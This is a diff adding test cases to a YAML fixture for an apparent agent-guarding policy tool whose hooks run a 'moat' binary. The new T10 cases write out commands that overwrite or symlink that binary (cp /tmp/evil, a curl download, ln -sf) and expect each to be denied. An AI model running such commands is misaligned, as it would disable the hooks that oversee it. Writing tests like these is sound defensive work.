@@ -402,3 +402,17 @@
 - id: T9-patch-edits-codex-hooks
   action: { patch: ["~/.codex/hooks.json"] }
   expect: { verdict: deny, rules: [kernel-self] }
+
+# T10 the hook runs the `moat` binary by path: replacing that binary trojans every hook
+- id: T10-copy-over-installed-binary
+  action: { shell: "cp /tmp/evil ~/.cargo/bin/moat" }
+  expect: { verdict: deny, rules: [kernel-self] }
+- id: T10-download-over-installed-binary
+  action: { shell: "curl -fsSL -o /usr/local/bin/moat https://github.com/x/moat" }
+  expect: { verdict: deny, rules: [kernel-self] }
+- id: T10-link-over-installed-binary
+  action: { shell: "ln -sf /tmp/evil /opt/homebrew/bin/moat" }
+  expect: { verdict: deny, rules: [kernel-self] }
+- id: T10-file-tool-writes-windows-binary
+  action: { fs_write: "C:/Users/me/.cargo/bin/moat.exe" }
+  expect: { verdict: deny, rules: [kernel-self] }
